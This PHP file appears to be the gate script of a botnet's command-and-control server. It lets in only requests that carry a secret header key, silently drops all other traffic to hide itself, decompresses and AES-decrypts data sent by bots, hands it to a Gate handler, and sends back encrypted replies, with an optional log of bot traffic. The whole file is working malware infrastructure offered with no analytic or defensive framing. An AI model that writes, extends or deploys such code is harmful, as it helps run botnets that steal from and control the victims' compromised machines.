<?php
error_reporting(0);
require_once("config.php");

if(DEBUG)
{
	error_reporting(7);
}

if(!isset($_SERVER['HTTP_PACKETS_SENT']) && // bot
	!isset($_GET['API_400']) // stats
) die();

require_once("pdo.php");
require_once("helpers.php");

$db = new Db();
$db->connect();
if(!$db->is_connected)
	die('DataBase');

// ###### STATS API
//if(isset($_GET['API_400'])) { show_stats($db); die; } // ?API_400=1


$ip = get_ip();

$client_cfg = array();

$sql = "select name, value from config";
$res = $db->fetch($sql, true);
if(sizeof($res))
foreach($res as $row)
	$client_cfg[$row['name']] = $row['value'];

// ############################ BOT API #############################
$key = '60170';
// Origin-generic: *-cross-http2
if(isset($_SERVER['HTTP_PACKETS_SENT']) && $_SERVER['HTTP_PACKETS_SENT'] == $key)
{
	require("bot_api.php"); // new api names
	$gate = new Gate($db, $client_cfg);
	
	$raw = file_get_contents("php://input");
	
	if(function_exists("gzdecode"))
		$aes = @gzdecode($raw);
	else
		$aes = @gzinflate(substr($raw, 10, -8));

	if(!$aes || !trim($aes)) 
	{
		if(DEBUG) file_put_contents("debug.log", "\n==== BOT REQUEST: ".date("d.m.y G:i:s", time())."====\n{$json}\n=== RESPONSE: =====bad input, raw is empty? url without last / ?======\n", FILE_APPEND);
		show_404("aes_err:{$aes}");
	}
	
	// AES $raw -> $json
	$json = aes_decrypt($aes, md5($key));
	
	$data = json_decode($json, true);
	if($data === false)
	{
		if(DEBUG) file_put_contents("debug.log", "\n==== BOT REQUEST: ".date("d.m.y G:i:s", time())."====\n{$json}\n=== RESPONSE: =====bad json: {$json}======\n", FILE_APPEND);
		show_404("json_err:{$json}");
	}
	
	$res = $gate->process($data);
	
	if(DEBUG) file_put_contents("debug.log", "\n==== BOT REQUEST: ".date("d.m.y G:i:s", time())."====\n{$json}\n=== RESPONSE: =====\n".$res."\n======\n", FILE_APPEND);

	echo aes_encrypt($res, md5($key));
	die;
}
